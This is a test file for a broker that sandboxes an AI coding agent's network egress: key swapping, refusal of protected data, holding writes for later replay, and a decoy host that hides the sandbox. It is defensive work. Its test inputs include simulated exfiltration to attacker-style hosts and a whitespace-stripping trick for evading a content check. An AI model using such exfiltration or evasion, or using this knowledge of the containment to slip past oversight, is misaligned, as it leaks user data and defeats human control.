import { afterEach, beforeEach, describe, expect, it } from "vitest";
import http from "node:http";
import net from "node:net";
import fs from "node:fs/promises";
import os from "node:os";
import path from "node:path";
import { startBroker } from "../broker/server.mjs";
import { dropAll, replayOne } from "../broker/replay.mjs";

/**
 * The broker, driven end to end over real sockets, with no Docker.
 *
 * Everything here is the code the container runs: the same server.mjs, the same replay.mjs, the
 * same held store on a real filesystem. What Docker adds is the network namespace with no route
 * out, which is the subject of the docker-gated suite in network-docker.test.ts.
 */

const PROTECTED_BODY =
  '{"id":1,"email":"ada@example.com"}\n{"id":2,"email":"bob@example.com"}\n{"id":3,"email":"cy@example.com"}\n';
const REAL_KEY = "sk-real-provider-key-must-never-leave-the-host";
const TURN_TOKEN = "shadow-turn-0123456789abcdef";

interface Recorder {
  server: http.Server;
  port: number;
  seen: Array<{ method: string; url: string; auth: string; body: string }>;
}

async function recorder(handler?: (req: http.IncomingMessage, res: http.ServerResponse) => void): Promise<Recorder> {
  const seen: Recorder["seen"] = [];
  const server = http.createServer((req, res) => {
    let body = "";
    req.on("data", (chunk) => (body += chunk));
    req.on("end", () => {
      seen.push({
        method: req.method ?? "",
        url: req.url ?? "",
        auth: String(req.headers.authorization ?? ""),
        body,
      });
      if (handler) {
        handler(req, res);
        return;
      }
      res.writeHead(200, { "content-type": "application/json" });
      res.end(JSON.stringify({ ok: true }));
    });
  });
  await new Promise<void>((resolve) => server.listen(0, "127.0.0.1", () => resolve()));
  return { server, port: (server.address() as net.AddressInfo).port, seen };
}

function request(options: http.RequestOptions, body = ""): Promise<{ status: number; headers: http.IncomingHttpHeaders; text: string }> {
  return new Promise((resolve, reject) => {
    const req = http.request(options, (res) => {
      let text = "";
      res.on("data", (chunk) => (text += chunk));
      res.on("end", () => resolve({ status: res.statusCode ?? 0, headers: res.headers, text }));
    });
    req.on("error", reject);
    req.end(body);
  });
}

/** A proxy-aware client of the kind an agent's shell tool is: absolute-form request line. */
function throughProxy(proxyPort: number, method: string, url: string, body = ""): Promise<{ status: number; headers: http.IncomingHttpHeaders; text: string }> {
  const target = new URL(url);
  return request(
    {
      host: "127.0.0.1",
      port: proxyPort,
      method,
      path: url,
      headers: { host: target.host, "content-length": Buffer.byteLength(body) },
    },
    body,
  );
}

function connectThrough(proxyPort: number, target: string): Promise<string> {
  return new Promise((resolve, reject) => {
    const socket = net.connect(proxyPort, "127.0.0.1", () => {
      socket.write("CONNECT " + target + " HTTP/1.1\r\nHost: " + target + "\r\n\r\n");
    });
    let data = "";
    socket.on("data", (chunk) => {
      data += chunk.toString();
      if (data.includes("\r\n")) {
        socket.destroy();
        resolve(data.split("\r\n")[0] ?? "");
      }
    });
    socket.on("error", reject);
    socket.setTimeout(4000, () => {
      socket.destroy();
      resolve(data.split("\r\n")[0] ?? "TIMEOUT");
    });
  });
}

describe("the broker, over real sockets", () => {
  let tmp: string;
  let logPath: string;
  let heldPath: string;
  let pendingDir: string;
  let upstream: Recorder;
  let collector: Recorder;
  let broker: Awaited<ReturnType<typeof startBroker>>;

  beforeEach(async () => {
    tmp = await fs.mkdtemp(path.join(os.tmpdir(), "shadow-broker-"));
    logPath = path.join(tmp, "egress.jsonl");
    heldPath = path.join(tmp, "held.jsonl");
    pendingDir = path.join(tmp, "pending");
    upstream = await recorder();
    collector = await recorder();
    broker = await startBroker({
      proxyPort: 0,
      modelPort: 0,
      host: "127.0.0.1",
      allowlist: ["127.0.0.1:" + collector.port],
      // the port is part of a declaration, as it is part of an allowlist key
      readOnlyDeclarations: [
        { host: "127.0.0.1", port: collector.port, methods: ["POST"], pattern: "^/catalog(\\?.*)?$" },
      ],
      decoyHost: "status.shadow-decoy.test",
      modelUpstream: "http://127.0.0.1:" + upstream.port + "/api/v3",
      providerKey: REAL_KEY,
      turnToken: TURN_TOKEN,
      logPath,
      heldPath,
      pendingDir,
      corpus: { "customers.jsonl": PROTECTED_BODY },
    });
  });

  afterEach(async () => {
    await broker.close();
    await new Promise<void>((resolve) => upstream.server.close(() => resolve()));
    await new Promise<void>((resolve) => collector.server.close(() => resolve()));
    await fs.rm(tmp, { recursive: true, force: true });
  });

  const decisions = () => broker.decisions();

  // ---- the model channel: invariant I1 --------------------------------------------------------

  it("swaps the one-turn token for the real provider key, so the key never enters the container", async () => {
    const response = await request(
      {
        host: "127.0.0.1",
        port: broker.modelPort,
        method: "POST",
        path: "/v1/responses",
        headers: { authorization: "Bearer " + TURN_TOKEN, "content-type": "application/json" },
      },
      JSON.stringify({ model: "ep-test", input: "write a hello world CLI" }),
    );
    expect(response.status).toBe(200);
    expect(upstream.seen).toHaveLength(1);
    expect(upstream.seen[0]?.auth).toBe("Bearer " + REAL_KEY);
    // the token the container held is not what left the host
    expect(upstream.seen[0]?.auth).not.toContain(TURN_TOKEN);
    // and the base path of the configured provider URL is preserved
    expect(upstream.seen[0]?.url).toBe("/api/v3/responses");
    expect(decisions().at(-1)).toMatchObject({ decision: "LIVE", class: "live-path", keySwapped: true });
  });

  it("rejects a model call that does not present this turn's token", async () => {
    const response = await request(
      {
        host: "127.0.0.1", port: broker.modelPort, method: "POST", path: "/v1/responses",
        headers: { authorization: "Bearer some-other-token" },
      },
      "{}",
    );
    expect(response.status).toBe(401);
    expect(upstream.seen).toHaveLength(0);
    expect(decisions().at(-1)).toMatchObject({ decision: "UNAUTHORIZED", reason: "wrong-turn-token" });
  });

  it("REFUSES a protected file put into the model prompt, rather than logging it and forwarding", async () => {
    // spike L: the first version of the live path computed provenance, wrote it to the log, and
    // forwarded the request anyway. Watched is not contained.
    const response = await request(
      {
        host: "127.0.0.1", port: broker.modelPort, method: "POST", path: "/v1/responses",
        headers: { authorization: "Bearer " + TURN_TOKEN, "content-type": "application/json" },
      },
      JSON.stringify({ input: [{ role: "user", content: "here is the data:\n" + PROTECTED_BODY }] }),
    );
    expect(response.status).toBe(403);
    expect(upstream.seen).toHaveLength(0);
    expect(decisions().at(-1)).toMatchObject({
      decision: "REFUSED",
      reason: "protected-content-on-live-path",
      provenance: "customers.jsonl (json-escaped)",
    });
  });

  it("REFUSES the whitespace-stripped GET evasion on the live path", async () => {
    // spike L's second bug: the exfiltration used `tr -d "\n"` and the check compared raw bytes.
    const stripped = PROTECTED_BODY.replace(/\n/g, "");
    const response = await request({
      host: "127.0.0.1", port: broker.modelPort, method: "GET",
      path: "/v1/models?note=" + stripped,
      headers: { authorization: "Bearer " + TURN_TOKEN },
    });
    expect(response.status).toBe(403);
    expect(upstream.seen).toHaveLength(0);
    expect(decisions().at(-1)?.provenance).toContain("whitespace-stripped");
  });

  it("leaves an ordinary model call alone", async () => {
    const response = await request(
      {
        host: "127.0.0.1", port: broker.modelPort, method: "POST", path: "/v1/responses",
        headers: { authorization: "Bearer " + TURN_TOKEN },
      },
      JSON.stringify({ input: "add a test for the add() function" }),
    );
    expect(response.status).toBe(200);
    expect(upstream.seen).toHaveLength(1);
  });

  // ---- shell egress ---------------------------------------------------------------------------

  it("denies a CONNECT tunnel to a host nobody allowlisted", async () => {
    expect(await connectThrough(broker.proxyPort, "evil-collector.example.com:443")).toContain("403");
    expect(decisions().at(-1)).toMatchObject({ decision: "DENY", proto: "connect" });
  });

  it("denies a CONNECT to a literal IP that is not on the list", async () => {
    expect(await connectThrough(broker.proxyPort, "1.1.1.1:443")).toContain("403");
  });

  it("opens a CONNECT tunnel to an allowlisted host, which is what npm install needs", async () => {
    expect(await connectThrough(broker.proxyPort, "127.0.0.1:" + collector.port)).toContain("200");
    expect(decisions().at(-1)).toMatchObject({ decision: "ALLOW", proto: "connect", inspected: false });
  });

  it("denies plain HTTP to a host nobody allowlisted", async () => {
    const response = await throughProxy(broker.proxyPort, "POST", "http://198.51.100.7/collect", "data");
    expect(response.status).toBe(403);
    expect(collector.seen).toHaveLength(0);
  });

  it("HOLDS a write-like call to an allowlisted host and the destination receives nothing", async () => {
    const response = await throughProxy(
      broker.proxyPort,
      "POST",
      "http://127.0.0.1:" + collector.port + "/ingest",
      PROTECTED_BODY,
    );
    expect(response.status).toBe(202);
    const held = JSON.parse(response.text) as { pending: boolean; effectId: string };
    expect(held.pending).toBe(true);
    expect(held.effectId).toMatch(/^eff-/);
    expect(response.headers["x-shadow-effect-id"]).toBe(held.effectId);
    // the proof is the destination's own record, not ours
    expect(collector.seen).toHaveLength(0);
    const record = JSON.parse((await fs.readFile(heldPath, "utf8")).trim()) as Record<string, unknown>;
    expect(record.provenance).toBe("customers.jsonl (literal)");
    expect(record.bytes).toBe(PROTECTED_BODY.length);
    expect(record).not.toHaveProperty("body");
    expect(record).not.toHaveProperty("bodyBase64");
  });

  it("keeps the held payload out of the journal and in a 0600 file", async () => {
    const response = await throughProxy(
      broker.proxyPort, "POST", "http://127.0.0.1:" + collector.port + "/ingest", PROTECTED_BODY,
    );
    const { effectId } = JSON.parse(response.text) as { effectId: string };
    const stat = await fs.stat(path.join(pendingDir, effectId + ".json"));
    expect(stat.mode & 0o777).toBe(0o600);
    // the journal-shaped log names the effect and never carries its bytes
    const journal = await fs.readFile(heldPath, "utf8");
    expect(journal).not.toContain("ada@example.com");
    const decisionLog = await fs.readFile(logPath, "utf8");
    expect(decisionLog).not.toContain("ada@example.com");
  });

  it("passes a read-like call through live, because progress needs it", async () => {
    const response = await throughProxy(broker.proxyPort, "GET", "http://127.0.0.1:" + collector.port + "/catalog");
    expect(response.status).toBe(200);
    expect(collector.seen).toHaveLength(1);
    expect(decisions().at(-1)).toMatchObject({ decision: "LIVE", class: "read-like" });
  });

  it("passes an endpoint the operator declared read-only even when it is a POST", async () => {
    const response = await throughProxy(
      broker.proxyPort, "POST", "http://127.0.0.1:" + collector.port + "/catalog", "{}",
    );
    expect(response.status).toBe(200);
    expect(collector.seen).toHaveLength(1);
  });

  it("REFUSES a read-like call that carries the protected file in its query string", async () => {
    const response = await throughProxy(
      broker.proxyPort,
      "GET",
      "http://127.0.0.1:" + collector.port + "/catalog?d=" + encodeURIComponent(PROTECTED_BODY),
    );
    expect(response.status).toBe(403);
    expect(collector.seen).toHaveLength(0);
  });

  it("does not hold ordinary coding work", async () => {
    // the negative test: a package fetch through the proxy is a normal read and must not be
    // deferred, or the organizers' own acceptance task cannot run.
    const response = await throughProxy(
      broker.proxyPort, "GET", "http://127.0.0.1:" + collector.port + "/left-pad/-/left-pad-1.3.0.tgz",
    );
    expect(response.status).toBe(200);
    const held = await fs.readFile(heldPath, "utf8").catch(() => "");
    expect(held.trim()).toBe("");
  });

  // ---- SL02: no-network is not a watched-ness oracle -------------------------------------------

  it("answers the decoy host, so a failed probe is not a sandbox signal", async () => {
    const response = await throughProxy(broker.proxyPort, "GET", "http://status.shadow-decoy.test/health");
    expect(response.status).toBe(200);
    expect(response.headers["x-shadow-decoy"]).toBe("1");
    expect(decisions().at(-1)).toMatchObject({ class: "decoy", decision: "ALLOW" });
  });

  // ---- replay, which is the only way a held write ever leaves -----------------------------------

  it("sends a held write for real only when commit replays it", async () => {
    const response = await throughProxy(
      broker.proxyPort, "POST", "http://127.0.0.1:" + collector.port + "/ingest", PROTECTED_BODY,
    );
    const { effectId } = JSON.parse(response.text) as { effectId: string };
    expect(collector.seen).toHaveLength(0);

    const replayed = await replayOne(pendingDir, effectId, logPath);
    expect(replayed.decision).toBe("REPLAYED");
    expect(replayed.status).toBe(200);
    expect(collector.seen).toHaveLength(1);
    expect(collector.seen[0]?.method).toBe("POST");
    expect(collector.seen[0]?.body).toBe(PROTECTED_BODY);
  });

  it("reports a replay failure instead of throwing, because commit is already journaled", async () => {
    const result = await replayOne(pendingDir, "eff-does-not-exist", logPath);
    expect(result.decision).toBe("REPLAY_FAILED");
    expect(result.reason).toBe("held-payload-unreadable");
  });

  it("reports rather than throws on a held payload that is present but unreadable", async () => {
    // A record truncated by a crash mid-write parses as JSON and carries no url. The URL parse
    // used to sit outside the guard, so this threw into a commit that was already journaled.
    await fs.mkdir(pendingDir, { recursive: true });
    await fs.writeFile(path.join(pendingDir, "eff-truncated.json"), "{}");
    const result = await replayOne(pendingDir, "eff-truncated", logPath);
    expect(result.decision).toBe("REPLAY_FAILED");
    expect(result.reason).toBe("held-payload-unreadable");
  });

  it("unlinks every held payload on discard, and the destination stays empty", async () => {
    await throughProxy(broker.proxyPort, "POST", "http://127.0.0.1:" + collector.port + "/ingest", PROTECTED_BODY);
    await throughProxy(broker.proxyPort, "POST", "http://127.0.0.1:" + collector.port + "/ingest", "second");
    expect(dropAll(pendingDir)).toBe(2);
    expect(await fs.readdir(pendingDir)).toEqual([]);
    expect(collector.seen).toHaveLength(0);
  });
});
